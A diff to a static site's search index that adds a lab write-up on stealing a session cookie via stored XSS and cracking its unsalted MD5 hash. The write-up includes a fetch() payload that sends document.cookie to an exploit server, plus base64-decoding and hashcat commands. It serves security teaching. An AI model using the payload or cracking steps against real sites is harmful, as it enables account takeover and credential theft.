@@ -1489,6 +1489,13 @@ window.store = {
         "url": "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_8\/"
     },
     
+    "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_9\/": {
+        "title": "Authentication Vulnerabilities: Lab 9: Offline password cracking after stealing user session cookie via xss",
+        "tags": ["WebSecurity","PortSwigger","web-exploitation","security-research","authentication","login","username-enumeration","response-timing","portswigger-labs","xss","cookie","ctf-writeup","python","hashcat","john","cracking","md5",],
+        "content": "Lab 9: Offline password cracking: This lab stores the user\u0026rsquo;s password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos\u0026rsquo;s stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the \u0026ldquo;My account\u0026rdquo; page.\nYour credentials: wiener:peter Victim\u0026rsquo;s username: carlos\nInitial Reconnaissance/Discovery: As usual we have a simple web application and a \u0026ldquo;My account\u0026rdquo; page \u0026amp; access to the exploit server which we will send the stolen cookie too. Logging in to View Cookie: As we know we need to steal the user\u0026rsquo;s cookie value via an XSS vulnerability \u0026amp; we know the vulnerability is in the comment section, let\u0026rsquo;s first login as our user \u0026ldquo;wiener\u0026rdquo; \u0026amp; tick the \u0026ldquo;Stay logged in\u0026rdquo; box so we can determine the name of the cookie and its contents. Looking at the cookie in the inspector we can see the below we can see there are two cookies, the \u0026ldquo;stay-logged-in\u0026rdquo; cookie and the standard session cookie. As we can see the standard session cookie has the \u0026ldquo;secure\u0026rdquo; \u0026amp; \u0026ldquo;HttpOnly\u0026rdquo; flags set meaning that we cannot target it (we know this but it\u0026rsquo;s good to check)\nhttps://owasp.org/www-community/HttpOnly https://owasp.org/www-community/controls/SecureCookieAttribute Decoding The Base64 Encoded Cookie Contents: Looking at the cookie value we can take a guess and assume it\u0026rsquo;s a base64 encoded string, however if you are unsure you can always throw it in hashes.com echo \u0026#34;d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw\u0026#34; | base64 -d Now I know this is an MD5 hash from experience and also contextually as I have been doing these labs \u0026amp; MD5 has been the standard so far. However, I understand that may not be obvious for some readers so an easy way to identify the hash type is by using either https://hashes.com/en/tools/hash_identifier or hashid in kali.\nUsing hashid \u0026amp; hashes.com To Identify The Hash Type: hashid \u0026#34;51dc30ddc473d43a6011e9ebba6ca770\u0026#34; Now that output is pretty messy as it could be ANY of those right. Well we can also use online tools such as https://hashes.com/en/tools/hash_identifier Using md5sum to Encode our Password: We can also do a simple a check by hashing our password with md5sum and then checking it against the base64 encoded cookie value.\necho -n peter | md5sum | awk \u0026#39;{print $1}\u0026#39; As we can see it matches.\nWhy This Is Bad: This means our cookie value is \u0026ldquo;username:[hashed md5 password with no salt]\u0026rdquo; then this is encoded in base64…if you hadn\u0026rsquo;t guessed it this is really insecure, couple this with not using \u0026ldquo;HttpOnly\u0026rdquo; or \u0026ldquo;Secure\u0026rdquo; cookie values and you have a recipe for disaster.\nEnumerating The Stored XSS Vulnerability: We know there is a stored xxs vulnerability and looking at the articles we have the ability to leave a comment and include our name, email \u0026amp; website. Let\u0026rsquo;s enumerate what field(s) are vulnerable.\nWe can fill all injection points with the payload below \u0026amp; modify the string to include the field name so we can determine which field is vulnerable.\n\u0026lt;script\u0026gt;console.log(\u0026#34;xsstest [fieldname]:\u0026#34;location.origin\u0026lt;/script) When we try and submit the payloads we get a popup regarding the format of the email address \u0026amp; website fields. It appears it\u0026rsquo;s parsing these field\u0026rsquo;s to ensure they have the correctly formatted strings in them. No way round. +Note+: We could use a work-around for these types of validations however for this lab it is unnecessary so we will just focus on the fields that are not validating our input.\nThis leaves us with the \u0026ldquo;Comment\u0026rdquo; \u0026amp; \u0026ldquo;Name\u0026rdquo; fields.\nWhen we submit these payloads they successful post. Now to validate our stored XSS we will ensure the console is open \u0026amp; reload the page. As we can see we get a hit for the comment section so we know there an xss vulnerability in the comment field.\nCrafting An XSS Payload To Steal The Users Cookie: Now we need to use our attack server to act as an endpoint to send carlos\u0026rsquo; cookie once the xss exploit retrieves it.\nWe can take the exploit server url \u0026amp; append place that in our payload so it becomes.\n\u0026lt;body onload=\u0026#34;fetch(\u0026#39;[explloitServerUrl\u0026#39;+document.cookie)\u0026#34;\u0026gt; We then submit this as a commment. Now when go back to the exploit server page we can check the \u0026ldquo;Access log\u0026rdquo; to see what has accessed the exploit server url. As we can see the exploit server has been accessed and it has the \u0026ldquo;stay-logged-in\u0026rdquo; cookie. +Note+: It also has the string \u0026ldquo;(Victim)\u0026rdquo; in the \u0026ldquo;user-agent\u0026rdquo; so that\u0026rsquo;s a dead giveaway.\nLet\u0026rsquo;s base64 decode it.\necho \u0026#34;Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz\u0026#34; | base64 -d As we can see it\u0026rsquo;s carlos\u0026rsquo; cookie! Cracking Carlos\u0026rsquo; Hash With Hashcat: Now we need to crack the hash so let\u0026rsquo;s put the hash in a file.\necho \u0026#34;26323c16d5f4dabff3bb136f2460a943\u0026#34; \u0026gt;\u0026gt; lab9.hash Now what you may notice is if we try and use the provided wordlist for this, the password will not be found. However there is a hint to why this is in the preceeding section:\nIn some rare cases, it may be possible to obtain a user\u0026rsquo;s actual password in cleartext from a cookie, even if it is hashed. Hashed versions of well-known password lists are available online, so if the user\u0026rsquo;s password appears in one of these lists, decrypting the hash can occasionally be as trivial as just pasting the hash into a search engine. This demonstrates the importance of salt in effective encryption.\nNow we could just paste this into hash into our search engine but that\u0026rsquo;s a bad idea on a real engagement so let\u0026rsquo;s use a well known password list, rockyou.txt.\n+Note+: rockyou.txt is available by default in kali, under /usr/share/wordlists/rockyou.txt.gz (it\u0026rsquo;s compressed compressed so you will need to decompress with gunzip rockyou.txt.gz /user/share/wordlists/rockyou.txt.gz\nWe can use hashcat to decrypt the password using hashcat.\nhashcat lab9.hash -m 0 /usr/share/wordlist/rockyou.txt As you can see we get a hit for onceuponatime Let\u0026rsquo;s login with these creds. As we can see we can login. Finally we delete carlos\u0026rsquo; account to solve the lab after we are prompted again to enter the password. Lab solved. ", 
+        "url": "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_9\/"
+    },
+    
     "http:\/\/localhost:1313\/author\/": {
         "title": "Author",
         "tags": [],
@@ -1508,6 +1515,13 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/cookie\/": {
+        "title": "Cookie",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/cookie\/"
     },
     
     "http:\/\/localhost:1313\/tags\/cracking\/": {
@@ -1627,6 +1641,13 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/tags\/websecurity\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/xss\/": {
+        "title": "XSS",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/xss\/"
     },
     
     "http:\/\/localhost:1313\/portswigger\/auth_vulns_lab_4\/": {
@@ -1984,13 +2005,6 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/tags\/selector-injection\/"
-    },
-    
-    "http:\/\/localhost:1313\/tags\/xss\/": {
-        "title": "XSS",
-        "tags": [],
-        "content": "", 
-        "url": "http:\/\/localhost:1313\/tags\/xss\/"
     },
     
     "http:\/\/localhost:1313\/portswigger\/dom_xss_lab_4\/": {
